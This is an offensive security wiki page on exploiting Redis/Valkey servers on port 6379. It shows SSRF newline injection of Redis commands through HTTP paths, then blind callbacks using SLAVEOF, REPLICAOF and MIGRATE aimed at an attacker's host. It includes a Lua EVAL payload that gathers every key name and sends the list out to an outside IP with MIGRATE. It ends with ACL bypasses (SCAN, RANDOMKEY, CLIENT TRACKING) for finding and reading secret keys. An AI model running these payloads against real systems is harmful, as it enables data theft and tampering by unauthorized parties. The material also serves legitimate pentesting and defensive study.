---
description: >-
  An in-memory data store often used to store small data like cache, sessions or
  queues
---

# Redis/Valkey - TCP/6379

## Description

The Redis [Documentation](https://redis.io/docs/about/) is a great way to learn about its features. It is a TCP server commonly bound to port 6379, using an **ASCII protocol**, with no binary data (see [Protocol](https://redis.io/docs/reference/protocol-spec/)). By sending commands, you can _authenticate_, _write_, and _read_ data at specific _keys_.&#x20;

Many more advanced features exist, see [Commands](https://redis.io/commands/) for all of them. Most are for managing big clusters of servers and maintenance tasks, but some are useful for dealing with all the different [data types](https://redis.io/docs/data-types/). The following are a few examples where you could often see Redis:

* **Caching** content for URLs or identifiers temporarily to reduce the load on a server
* Storing **sessions** of logged-in users with their associated data
* Holding **queues** of processing requests that a server will take from

## SSRF

In a lucky scenario, you might have direct access to the Redis port and can interact with it. But often this application is only accessible locally (127.0.0.1), or on a different backend instance. In these cases you need to persuade a target that can reach it, to send requests on your behalf. With Server-Side Request Forgery vulnerabilities, you may be able to send arbitrary HTTP requests, or even raw TCP data to a location you control. A common technique is targetting this at a Redis server at port :6379 and seeing if you can exploit it in any way.&#x20;

To find a Redis server you can try to reach out to localhost (127.0.0.1 or [variations](https://highon.coffee/blog/ssrf-cheat-sheet/#basic-locahost-bypass-attempts)), as well as internal hosts like the docker (172.17.0.0/16, note that it may be changed), and hostnames like "redis". You can send some simple command to view if a clean response comes back (testing by connecting to your own system helps), but often you will be doing this blind. See [#detection-callbacks](redis-valkey-tcp-6379.md#detection-callbacks "mention") for ideas on detecting this remotely.

### HTTP

HTTP is a common target for SSRF vulnerabilities as servers often make such requests. Redis is a plaintext protocol meaning it _would_ be easy to write some POST data with command that it will execute. Therefore, the developers have thought about this. Sending any command starting with `POST` or `Host:` (case-insensitive) will **quit** the connection, possibly before you had your chance to write any commands. We need to be more creative.&#x20;

As every request should have a `Host:` header, we have 3 places where we could possibly inject commands before it terminates:

1. The **request method** itself, the first thing it sees. If we simply make this a GET request (a default redis command), it won't quit and by inserting `\r\n` newline characters we may even be able to insert more commands
2. The **location** (path) of the request, right after the method. If we are able to insert newline characters here you can write more commands. Note that this is impossible for POST requests as they quit early
3. **Extra headers** before the `Host:` header, which may have newline injection possibilities or, because the name is the start of a line, the name can be a command by itself

<pre class="language-http" data-title="Example"><code class="lang-http">Injection into the path with newlines:
<strong>/endpoint%0d%0aKEYS *%0d%0a
</strong>
<strong>GET /endpoint
</strong><strong>KEYS *
</strong><strong>HTTP/1.1
</strong>Host: ...
</code></pre>

### Detection: Callbacks

For **Blind SSRF** scenarios where you are unsure about the backend, and if it is vulnerable, you can try to generate a simple callback to yourself to confirm that you are executing Redis commands. These expect to interact with another Redis server that you can set up, but will also simply connect and send data to a simple `nc` listener that you make. Here are some ways:

```powershell
# Turn server into a "replica" of master (commands are equivalent)
SLAVEOF [HOST] [PORT]
REPLICAOF [HOST] [PORT]

# Set and exfiltrate a key
SET key1 "test"
MIGRATE [HOST] [PORT] key1 0 5000
```

### Exploitation

See [Enumeration](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#manual-enumeration) for examples where you directly receive a response, as well as some RCE techniques further down the page. With an active system the [`MONITOR`](https://redis.io/commands/monitor/) command can also give good information about incoming queries and writes.

**Without a response,** there are still some powerful things you can leak. Above we saw some ways of detecting a callback to your server, but the [`MIGRATE`](https://redis.io/commands/migrate/) command is very powerful for this. It sends the _value of a key_ to _your server_, which can be after you perform some complex commands and saving a result in such a key! This way we can exfiltrate data and responses as if we were interacting directly.&#x20;

For the cleanest output, simply set up a simple Redis server, for example with docker:

```bash
docker run -p 6379:6379 --name redis-listener -d redis
```

Then with `redis-cli` locally you can view all data, and using `MONITOR` even in real-time!

We will trigger some commands on the server that will try to send a key and value to our new server. Try it with the `key1` payload shown above, and the callback with content should appear:

<pre class="language-sh"><code class="lang-sh">> MONITOR
1694377609.839835 [0 127.0.0.1:60688] "SELECT" "0"
<strong>1694377609.839844 [0 127.0.0.1:60688] "RESTORE" "key1" "0" "\x00\x04test\x0b\x00\xe8O\x12\xd3\x91nY\xcc"
</strong>> GET key1
<strong>"test"
</strong></code></pre>

While it is a good confirmation of the vulnerability, we can try to exploit it to gain more impact. Instead of leaking our own key, we can leak some keys that it stores, but how do we find the names of the keys? This is where the powerful Lua scripting ([`EVAL`](https://redis.io/commands/eval/)) can come into play. We will list and write all the keys to a single value, which we can leak through the `MIGRATE` method:

{% code title="Lua" overflow="wrap" %}
```lua
local keys = redis.call('KEYS', '*')
local keyList = table.concat(keys, ',')
redis.call('SET', 'output', keyList)
return keyList
```
{% endcode %}

This will run the `KEYS *` command (or any command you like), and concat the results with a `,` comma, and finally save this list to a key named `output` which we can leak:

{% code title="Redis: List and leak keys" %}
```powershell
EVAL "local keys = redis.call('KEYS', '*') local keyList = table.concat(keys, ',') redis.call('SET', 'output', keyList) return keyList" 0
MIGRATE 10.10.10.10 6379 output 0 5000
```
{% endcode %}

```sh
> monitor
1694378430.919743 [0 127.0.0.1:43416] "RESTORE" "output" "0" "\x00\tsecret1,secret2\x0b\x00\xbd\xaeEG\x1b\xb8d\xd7"
> get output
"secret1,secret2"
```

Remember that you can now always leak a key by name using this method, and find all the secrets even with random names. Also, remember that more commands can be executed like this to enumerate the instance as needed.&#x20;

Then when you finally understand _how_ the system is used, you can try to **exploit it** by (over)writing data in the store. This can cause all kinds of unexpected vulnerabilities as developers often trust data coming from their own Redis store, causing injection, deserialization, or other access vulnerabilities on the main application. This can simply be done with the `SET` commands blindly.

## ACLs

As always, the [Redis Documentation](https://redis.io/docs/management/security/acl/) explains ACLs in great detail by itself. The gist is that developers can add Access Control Lists with security rules for specific users to restrict what commands they have access to. There is one special user called "default" that does not require a password.

This section contains some common rules that can be bypassed in various ways.

### Discovering keys

When the `-@dangerous` permission is set, all commands in this ACL group are disabled, such as `KEYS` to discover keys that may have a randomly generated name that you cannot guess. While a developer might see this as a protection, there are various non-`@dangerous` ways and alternative ways to leak these key names with different commands:

#### [`SCAN`](https://redis.io/commands/keys/)

An almost drop-in replacement for the `KEYS` command is `SCAN` which incrementally returns a subset of all keys. Using the `COUNT` argument you can get as many as you want to discover all keys:

<pre class="language-python" data-title="Redis"><code class="lang-python"><strong>> SCAN 0 COUNT 999
</strong>1) "0"
2) 1) "supersecretkey1"
   2) "supersecretkey2"
   ...
</code></pre>

#### [`RANDOMKEY`](https://redis.io/commands/randomkey/)

A simple but effective way to bypass a forbidden `KEYS` command is to get a `RANDOMKEY`, which does exactly what you think it does. By sending it many times you can get as many keys as you like until you get the one you need. This is an [easy mistake](https://github.com/saarsec/saarctf-2023/blob/master/redis-bbq/exploits/unintended-exploits.txt#L2) to make because `KEYS` is part of the `@dangerous` ACL group, while `RANDOMKEY` is not!

<pre class="language-python" data-title="Redis"><code class="lang-python"><strong>> RANDOMKEY
</strong>"boringkey5"
> RANDOMKEY
"boringkey2"
<strong>> RANDOMKEY
</strong>"supersecretkey"
</code></pre>

#### [`CLIENT TRACKING`](https://redis.io/commands/client-tracking/)

Another more advanced method is using the [TRACKING](https://redis.io/commands/client-tracking/) feature of Redis, where you can listen for keys that change globally. By creating a client, registering the invalidation for BCAST (all keys), and then subscribing to the channel. You instantly get a message whenever a key is _added_ or _written to_.&#x20;

<pre class="language-python" data-title="Redis"><code class="lang-python"><strong>> CLIENT ID
</strong>(integer) 42
<strong>> CLIENT TRACKING on REDIRECT 42 BCAST
</strong>OK
<strong>> SUBSCRIBE __redis__:invalidate  # Start interactively listening
</strong>Reading messages... (press Ctrl-C to quit)
1) "subscribe"
2) "__redis__:invalidate"
3) (integer) 1
1) "message"
2) "__redis__:invalidate"
<strong>3) 1) "supersecretkey"  # Result from a 'SET supersecretkey value' command
</strong></code></pre>

### Reading data

When you have found an interesting key you'll often want to read its contents. There are a few different [types](https://redis.io/commands/type/) of keys all with their own 'get' commands. Here are most of them:

* [string](https://redis.io/docs/data-types/strings/): [`GET`](https://redis.io/commands/get/) -> `GET key`
* [list](https://redis.io/docs/data-types/lists/): [`LRANGE`](https://redis.io/commands/lrange/) -> `LRANGE key 0 -1`
* [set](https://redis.io/docs/data-types/sets/): [`SMEMBERS`](https://redis.io/commands/smembers/) -> `SMEMBERS key`
* [zset](https://redis.io/docs/data-types/sorted-sets/): [`ZRANGE`](https://redis.io/commands/zrange/) -> `ZRANGE key 0 -1 withscores`
* [hash](https://redis.io/docs/data-types/hashes/): [`HGETALL`](https://redis.io/commands/hgetall/) -> `HGETALL key`
* [steam](https://redis.io/docs/data-types/streams/): [`XRANGE`](https://redis.io/commands/xrange/) -> `XRANGE key - +`
* [json](https://redis.io/docs/data-types/json/) (plugin): [`JSON.GET`](https://redis.io/commands/json.get/) -> `JSON.GET key`

Another useful general command that works on **all** data types is `DUMP` which returns the binary representation of the data, often with readable strings and metadata included.&#x20;
